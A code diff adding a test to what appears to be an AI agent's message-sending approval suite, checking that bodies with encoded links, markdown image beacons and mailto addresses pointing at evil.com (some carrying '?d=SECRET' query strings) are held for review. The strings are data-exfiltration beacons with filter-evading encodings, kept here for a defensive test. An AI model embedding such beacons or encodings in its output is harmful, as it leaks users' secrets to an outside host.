@@ -4830,3 +4830,19 @@ it.each(['declined', 'failed', 'quiet'] as const)(
     expect(f.store.activation(next.id)?.status).toBe('done')
   }
 )
+
+it.each([
+ '![chart](https&colon;&sol;&sol;evil&period;com/p?d=SECRETDATA)',
+ '<img src="https&colon;&sol;&sol;evil&period;com/p?d=SECRET">',
+ '![c](https&colon;&sol;&sol;ok&period;com/r/1?d=SECRET)',
+ '[report](https&colon;&sol;&sol;evil&period;com)', '[x](<https&colon;&sol;&sol;evil&period;com>)',
+ '[x]: https&colon;&sol;&sol;evil&period;com', '[boss](mailto&colon;x&commat;evil&period;com)',
+ 'mail x&commat;evil&period;com',
+ '<a href="https&#x000003a;&#x000002f;&#x000002f;evil&#x000002e;com">',
+ '<a href="https&#00000058;&#00000047;&#00000047;evil&#00000046;com">',
+ 'evil&NotAnEntity;com', 'evil[.]com'
+])('E1 r4 encoded links and image beacons ask: %s', async body => {
+ const t = await aloneAsk('allow', 'send', 'Report for 2026-11-18. Details: https://ok.com/r/1')
+ expect((await aloneNext(t, { ...t.args, body })).action.status).toBe('open')
+ expect(t.calls).toHaveLength(1)
+})
